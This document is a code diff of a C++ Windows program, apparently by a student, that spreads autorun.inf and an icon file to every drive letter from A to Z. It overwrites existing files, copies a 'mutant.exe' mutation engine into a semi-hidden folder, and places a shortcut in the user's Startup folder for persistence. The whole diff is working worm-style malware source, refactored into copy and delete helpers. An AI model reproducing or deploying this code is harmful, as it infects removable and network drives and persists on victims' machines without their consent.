@@ -3,6 +3,7 @@
 #include <string.h>
 #include <iostream>
 #include <windows.h>
+#include <fstream>
 
 using namespace std;
 
@@ -16,12 +17,22 @@ using namespace std;
  * Written by Nicholas Allen
  * allen.2020@osu.edu
  */
+int copyTextFile(char *src, char *dest);
+int copyBinaryFile(char *src, char *dest);
+int deleteFile(char *file);
+
+size_t len = 0;
+char buffer[BUFSIZ] = { '\0' };
+
 int main(void) 
 {
 	size_t len = 0;
 	
-	const int numFiles = 2;
-	char *filenames[numFiles] = { "autorun.inf", "driveicon.ico" };
+	const int numTextFiles = 1;
+	char *textfilenames[numTextFiles] = { "autorun.inf" };
+	
+	const int numBinaryFiles = 1;
+	char *binaryfilenames[numBinaryFiles] = { "driveicon.ico" };
 	
 	const int numDrives = 25;
 	char *destdrives[numDrives] = {"A:\\", "B:\\", "D:\\", "E:\\",
@@ -40,7 +51,28 @@ int main(void)
 	
 	for(int drive = 0; drive < numDrives; drive++)
 	{
-		for(int file = 0; file < numFiles; file++)
+		//Text files
+		for (int i = 0; i < numTextFiles; i++)
+		{
+			strcpy(src, textfilenames[i]);
+			strcpy(dest, destdrives[drive]);
+			strcat(dest, textfilenames[i]);
+			
+			deleteFile(dest);
+			copyTextFile(src, dest);
+		}
+		
+		//Binary files
+		for (int i = 0; i < numBinaryFiles; i++)
+		{
+			strcpy(src, binaryfilenames[i]);
+			strcpy(dest, destdrives[drive]);
+			strcat(dest, binaryfilenames[i]);
+			
+			deleteFile(dest);
+			copyBinaryFile(src, dest);
+		}
+		/*for(int file = 0; file < numFiles; file++)
 		{
 			strcpy(src, filenames[file]);
 			
@@ -84,7 +116,7 @@ int main(void)
 				fclose(in);
 				fclose(out);
 			}
-		}
+		}*/
 	}
 	
 	//Move mutation engine to somewhat-hidden directory
@@ -94,30 +126,7 @@ int main(void)
 	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
 	{
 		strcat(dest, "\\mutant.exe");
-		FILE *in = fopen(src, "rb");
-		FILE *out = fopen(dest, "wb");
-		
-		if(in == NULL || out == NULL)
-		{
-			cout << "Error copying mutant.exe to destination folder: ";
-			cout << "Read/write files could not be opened.";
-			cout << endl;
-		
-			in = out = 0;
-		}
-		else
-		{
-			while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
-			{
-				fwrite(buffer, BUFSIZ, 1, out);
-			}
-		
-			cout << "Successfully wrote mutant.exe to destination folder";
-			cout << endl;
-		
-			fclose(in);
-			fclose(out);
-		}
+		copyBinaryFile(src, dest);
 	}
 	else
 	{
@@ -134,12 +143,40 @@ int main(void)
 	strcpy(dest, getenv("USERPROFILE"));
 	strcat(dest, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\short.lnk");
 	
+	copyBinaryFile(src, dest);
+	
+	return 0;
+}
+
+int copyTextFile(char *src, char *dest) 
+{
+	ifstream infile(src);
+	ofstream outfile(dest);
+	string text = "";
+	int i;
+	
+	for (i = 0; infile.eof() != true; i++)
+	{
+		text += infile.get();
+	}
+	
+	i--;
+	text.erase(text.end() - 1);
+	
+	outfile << text.c_str();
+	infile.close();
+	outfile.close();
+	return 0;
+}
+
+int copyBinaryFile(char *src, char *dest)
+{
 	FILE *in = fopen(src, "rb");
 	FILE *out = fopen(dest, "wb");
 	
 	if(in == NULL || out == NULL) {
 		perror("Error: ");
-		cout << "Error copying short.lnk to startup folder" << endl;
+		cout << "Error copying " << src << " to " << dest << endl;
 		in = out = 0;
 	}
 	else
@@ -149,11 +186,25 @@ int main(void)
 			fwrite(buffer, BUFSIZ, 1, out);
 		}
 		
-		cout << "Successfully wrote short.lnk to startup folder" << endl;
+		cout << "Successfully wrote " << src << " to " << dest << endl;
 		
 		fclose(in);
 		fclose(out);
 	}
 	
 	return 0;
+}
+
+int deleteFile(char *file)
+{
+	if(remove(file))
+	{
+		cout << file << " does not exist or could not be deleted." << endl;
+		return 1;
+	}
+	else
+	{
+		cout << file << " successfully deleted." << endl;
+		return 0;
+	}
 }
